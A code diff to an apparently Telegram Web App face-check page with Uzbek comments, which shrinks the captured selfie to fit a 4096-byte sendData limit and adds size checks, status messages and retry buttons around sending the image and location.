@@ -344,6 +344,7 @@
             title.innerText = "✅ Ajoyib! Yuborilmoqda...";
             title.style.color = "green";
             camBox.className = "camera-wrapper success";
+            statusTxt.innerText = "Rasm tayyorlanmoqda...";
             
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -360,10 +361,13 @@
             previewImg.src = canvas.toDataURL('image/jpeg');
             previewImg.style.display = 'block';
 
-            // Kichraytirish (Telegram uchun)
+            // Telegram Web App uchun juda kichik rasm (max 4096 bayt)
+            // Rasmni kichraytirish va sifatni pasaytirish
             const smallCanvas = document.createElement('canvas');
-            const size = 300; 
-            smallCanvas.width = size; smallCanvas.height = size;
+            let size = 200; // 300 dan 200 ga kamaytirdik
+            let quality = 0.5; // 0.7 dan 0.5 ga pasaytirdik
+            smallCanvas.width = size; 
+            smallCanvas.height = size;
             const sCtx = smallCanvas.getContext('2d');
             
             // Markazdan qirqish
@@ -372,32 +376,109 @@
             const sy = (canvas.height - minSide) / 2;
             sCtx.drawImage(canvas, sx, sy, minSide, minSide, 0, 0, size, size);
 
-            const base64 = smallCanvas.toDataURL('image/jpeg', 0.7);
+            // Rasmni base64 ga o'tkazish va hajmini tekshirish
+            let base64 = smallCanvas.toDataURL('image/jpeg', quality);
+            let base64Data = base64.split(',')[1];
             
-            // Base64 dan prefixni olib tashlash
-            const base64Data = base64.split(',')[1];
+            // Agar hali ham katta bo'lsa, yanada kichraytiramiz
+            const maxSize = 3500; // 4096 dan biroz kichik (JSON uchun joy qoldiramiz)
+            let attempts = 0;
+            while (base64Data.length > maxSize && attempts < 5) {
+                size = Math.max(150, size - 20);
+                quality = Math.max(0.3, quality - 0.1);
+                smallCanvas.width = size;
+                smallCanvas.height = size;
+                sCtx.clearRect(0, 0, size, size);
+                sCtx.drawImage(canvas, sx, sy, minSide, minSide, 0, 0, size, size);
+                base64 = smallCanvas.toDataURL('image/jpeg', quality);
+                base64Data = base64.split(',')[1];
+                attempts++;
+                console.log(`🔄 Rasm kichraytirilmoqda... (${base64Data.length} bytes, size: ${size}, quality: ${quality})`);
+            }
 
             // Ma'lumotlarni yuborish
             setTimeout(() => {
                 const data = {
-                    img: base64Data,  // 'img' yoki 'image' - handler ikkalasini ham qo'llab-quvvatlaydi
-                    loc: userLocation || { lat: 0, long: 0 }  // 'loc' yoki 'location'
+                    img: base64Data,
+                    loc: userLocation || { lat: 0, long: 0 }
                 };
+                
+                const jsonData = JSON.stringify(data);
+                const dataSize = new Blob([jsonData]).size;
                 
                 console.log("📤 Ma'lumot yuborilmoqda...", { 
                     hasImage: !!data.img, 
+                    imageSize: base64Data.length,
                     hasLocation: !!data.loc,
-                    location: data.loc 
+                    location: data.loc,
+                    totalSize: dataSize,
+                    maxSize: 4096
                 });
                 
+                // Ma'lumot hajmini tekshirish
+                if (dataSize > 4096) {
+                    console.error("❌ Ma'lumot juda katta:", dataSize, "bytes");
+                    statusTxt.innerText = "❌ Rasm juda katta. Qayta urinib ko'ring.";
+                    title.innerText = "❌ Xatolik";
+                    title.style.color = "red";
+                    
+                    // Qayta urinish tugmasi
+                    const retryBtn = document.createElement('button');
+                    retryBtn.innerText = "🔄 Qayta urinish";
+                    retryBtn.style.cssText = "margin-top: 15px; padding: 10px 20px; background: #2ea6ff; color: white; border: none; border-radius: 20px; cursor: pointer; font-size: 14px;";
+                    retryBtn.onclick = () => {
+                        retryBtn.remove();
+                        // Kamerani qayta ishga tushirish
+                        video.style.display = 'block';
+                        previewImg.style.display = 'none';
+                        currentStep = 1;
+                        title.innerText = "⬅️ Boshingizni CHAPGA buring";
+                        title.style.color = "#333";
+                        statusTxt.innerText = "Yuz qidirilmoqda...";
+                        camBox.classList.remove('success');
+                        camBox.classList.add('active');
+                        detectionInterval = setInterval(detectFace, 200);
+                    };
+                    
+                    const oldBtn = document.querySelector('#retry-send-btn');
+                    if (oldBtn) oldBtn.remove();
+                    retryBtn.id = 'retry-send-btn';
+                    document.body.appendChild(retryBtn);
+                    return;
+                }
+                
+                statusTxt.innerText = "Yuborilmoqda...";
+                
                 try {
-                    tg.sendData(JSON.stringify(data));
-                    console.log("✅ Ma'lumot yuborildi!");
+                    // Telegram Web App sendData
+                    if (typeof tg.sendData === 'function') {
+                        tg.sendData(jsonData);
+                        console.log("✅ Ma'lumot yuborildi!");
+                        statusTxt.innerText = "✅ Yuborildi!";
+                    } else {
+                        throw new Error("sendData funksiyasi mavjud emas");
+                    }
                 } catch (e) {
                     console.error("❌ Yuborish xatosi:", e);
-                    alert("Xato: Ma'lumot yuborilmadi. " + e);
+                    statusTxt.innerText = `❌ Xatolik: ${e.message || e}`;
+                    title.innerText = "❌ Xatolik";
+                    title.style.color = "red";
+                    
+                    // Qayta urinish tugmasi
+                    const retryBtn = document.createElement('button');
+                    retryBtn.innerText = "🔄 Qayta urinish";
+                    retryBtn.style.cssText = "margin-top: 15px; padding: 10px 20px; background: #2ea6ff; color: white; border: none; border-radius: 20px; cursor: pointer; font-size: 14px;";
+                    retryBtn.onclick = () => {
+                        retryBtn.remove();
+                        captureAndSend();
+                    };
+                    
+                    const oldBtn = document.querySelector('#retry-send-btn');
+                    if (oldBtn) oldBtn.remove();
+                    retryBtn.id = 'retry-send-btn';
+                    document.body.appendChild(retryBtn);
                 }
-            }, 1000);
+            }, 500);
         }
 
         init();
